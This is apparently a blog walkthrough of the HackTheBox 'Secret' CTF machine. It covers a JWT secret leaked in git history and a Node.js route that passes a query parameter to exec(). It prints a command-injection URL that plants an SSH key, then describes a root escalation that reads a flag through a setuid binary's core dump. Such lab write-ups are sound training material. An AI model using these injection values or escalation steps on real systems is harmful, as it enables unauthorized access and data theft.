---
title: "HackTheBox: \"Secret\" Walkthrough"
date: 2022-04-25T14:00:00.000Z
tags: ['hackthebox', 'ctf']
slug: "hackthebox-secret-walkthrough"
categories: ["HackTheBox Walkthrough"]
draft: false
---

This machine might be interesting to those who don't like the
repetitive and rather boring task of scanning a host - because it
doesn't require any of that.<!--more-->

## Foothold

As usual, this machine has a landing page - we will find a ZIP file there,
which we download, of course. We will immediately notice the `.git` folder,
so let's use `git log` to inspect what happened there. One of the commit
messages sounds interesting:

> removed .env for security reasons

Let's inspect the changes introduced by this commit:

```diff
-TOKEN_SECRET = gXr67TtoQL8TS...
+TOKEN_SECRET = secret
```

This sounds a lot like a real world scenario - left over credentials in a
git repository are not unheard of.

Now, let's explore the contents of the ZIP file further. In the file `private.js`
we find this particular interesting snippet:

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;

    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

## User

The path is clear: Forge a JWT token for user "theadmin" and use the "file"
query parameter to execute arbitrary commands:

```plain
http://10.10.11.120:3000/api/logs?file=x;
mkdir ~/.ssh;chmod 700 ~/.ssh;
echo "ssh-rsa ..." > ~/.ssh/authorized_keys;
chmod 600 ~/.ssh/authorized_keys;
```

Note that I've added line breaks for better readability. Also note that before
sending this request, the query parameter must be URL encoded - otherwise the
command will break, for example because the `+` character will be interpreted as space.
Anway, we can now login via SSH and are done with the first part.

*NB: I **always** set the permissions like this, because I once had a machine were it didn't work
when the permissions were not exactly like this - and debugging this cost me a long time.*

## Root

Up next: Privilege escalation. As usual, I'm relying on LinPEAS to give me a hint - which it does.
LinPEAS shows us that `/opt/count` is a setuid binary. As such, it can read every file on the system.
The output is some kind of word/line count, so we don't get access to the file contents.

Now, everything that I tried to interfere with the execution of this binary failed. Or, to be more
precise, everytime I tried something (like running the binary with gdb), the setuid bit gets dropped.
Guess that makes sense, otherwise we could also attach to binaries like `sudo`...

Conveniently, we'll find the source code of the binary next to it. Here is the interesting part
(in the lines before the following snippet, the input file is read):
```c
// drop privs to limit file write
setuid(getuid());
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
printf("Save results a file? [y/N]: ");
res = getchar();
```
Let's look at the manpage of prctl:
> **PR_SET_DUMPABLE:** Set  the  state  of  the  "dumpable"  flag, which determines whether core dumps are
produced for the calling process upon delivery of a signal whose  default  behavior
is to produce a core dump. [...]
Normally, this flag is set to 1.   However,  it  is  reset  to  the  current  value
contained  in  the  file /proc/sys/fs/suid_dumpable (which by default has the value
0), in the following circumstances:
The process's effective user or group ID is changed. [...]

So again, we have a way forward: Run the binary, read `/root/root.txt`, and
as soon as the prompt appears, produce a coredump using:
```plain
kill -SIGSEGV $(pidof count)
```
Now, were can we find that coredump? Let's check:
```plain
$ cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
```
We see that this machine uses [Apport](https://wiki.ubuntu.com/Apport).
Apport comes with some tools, one is:
> **apport-unpack**: Unpack a report into single files (one per attribute). This is most useful for extracting the core dump. Please see the manpage for further details. This tool is not necessary when working with Launchpad, since it already splits the parts into separate attachments.

All right - let's try it:
```plain
$ apport-unpack /var/crash/_opt_count.1000.crash tmp/
$ strings tmp/CoreDump
```
That's it! 😀

## Conclusion and Learnings

I was able to get the user flag really quick - having credentials in a git
repository and forging a JWT token was not too interesting.
But the privilege escalation took me quite a bit, as I lost a lot of time
on trying to *somehow* attach to the binary. Only after I was out of ideas,
I looked in the folder where the binary is to find the source code - and the
obvious clue. From there, finding out how to provoke a segfault and read
the coredump also took some time, but could be done with a few searches.
